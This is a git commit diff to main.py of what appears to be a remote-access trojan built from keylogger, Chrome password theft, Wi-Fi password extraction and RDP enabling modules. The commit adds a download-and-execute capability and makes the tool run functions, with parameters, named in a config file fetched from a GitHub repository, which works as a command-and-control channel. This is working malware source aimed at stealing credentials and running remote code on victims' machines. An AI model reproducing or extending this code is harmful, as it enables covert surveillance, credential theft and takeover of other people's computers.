825ad5d9665c177d811265f2f6a4bd64a984d8e1
JelleFirlefyn <48584903+JelleFirlefyn@users.noreply.github.com>
2023-05-17 21:16:39 +0200

    Added documentation for remote code

--- main.py
+++ main.py
@@ -3,6 +3,7 @@ from sysinfo import sysinfo
 from keylogger import keylogger
 from chromepasswords import chromepasswords
 from wifipasswords import wifipasswordextractor
+from externalcode import download_and_execute
 from rdp import RDPEnabler
 import base64
 import json
@@ -20,27 +21,35 @@ REPO = os.getenv("repo")
 CONFIG_FILE = os.getenv("config-file")
 STOP = False
 
-def fetch_config(repo_url: str, config_file: str) -> Dict:
-    #Fetches the config file from a GitHub repository and returns its contents as a dictionary.
+def fetch_config(repo_url: str, config_file: str) -> dict:
+    # Fetches the config file from a GitHub repository and returns its contents as a dictionary.
     api_url = f"https://api.github.com/repos/{repo_url}/contents/{config_file}"
     response = requests.get(api_url)
     response.raise_for_status()
     content = response.json()["content"]
     decoded_content = base64.b64decode(content).decode("utf-8")
+    config = json.loads(decoded_content)
     
-    return json.loads(decoded_content)
+    return config
 
 def run_functions(repo_url: str, config_file: str):
-    #Fetches the config file from a GitHub repository and executes the functions listed in the file.
+    # Fetches the config file from a GitHub repository and executes the functions listed in the file.
     config = fetch_config(repo_url, config_file)
-    for function_name in config:
+    
+    for function_name, function_data in config.items():
+        if function_name == "variables":
+            continue
+        
+        parameters = function_data.get("parameters", {})  # Get the parameters for the function
+        
         if '.' in function_name:
             class_name, method_name = function_name.split('.')
             cls = globals()[class_name]()
             method = getattr(cls, method_name)
-            method()
+            method(**parameters)  # Pass the parameters as keyword arguments to the method
         else:
-            globals()[function_name]()
+            globals()[function_name](**parameters)  # Pass the parameters as keyword arguments to the function
+
 
 def mod_keylogger():
     # Keylogger duration is set to 10s:
@@ -79,6 +88,10 @@ def mod_wifipasswords():
     wp.write()
     wp.send()
     wp.remove()
+
+def mod_downloadexecute(repository_url, file_path):
+    if not (repository_url == "" or file_path == ""):
+        download_and_execute(repository_url, file_path)
 
 def stop():
     STOP = True
